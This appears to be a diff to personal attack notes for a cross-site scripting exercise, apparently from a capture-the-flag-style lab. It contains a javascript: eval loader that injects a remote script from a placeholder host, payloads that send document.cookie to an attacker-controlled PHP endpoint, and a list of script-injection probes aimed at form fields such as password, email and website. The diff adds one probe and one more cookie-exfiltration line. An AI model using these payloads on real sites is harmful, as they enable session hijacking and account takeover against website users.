@@ -25,7 +25,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 
 Script.js(Makes request to our php endpoint)
 ```javascript
-<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
+new Image().src='http://OUR_IP/index.php?c='+document.cookie
 ```
 
 
@@ -50,5 +50,10 @@ if (isset($_GET['c'])) {
 "><script src="http://10.10.14.41/password"></script>
 "><script src="http://10.10.14.41/email"></script>
 "><script src="http://10.10.14.41/profilePIC"></script>
-
+"><script src="http://10.10.14.41/website"></script>
 "><script src="http://10.10.14.41:80/script.js"></script>
+
+
+```
+new Image().src='http://10.10.14.41:80/index.php?c='+document.cookie
+```
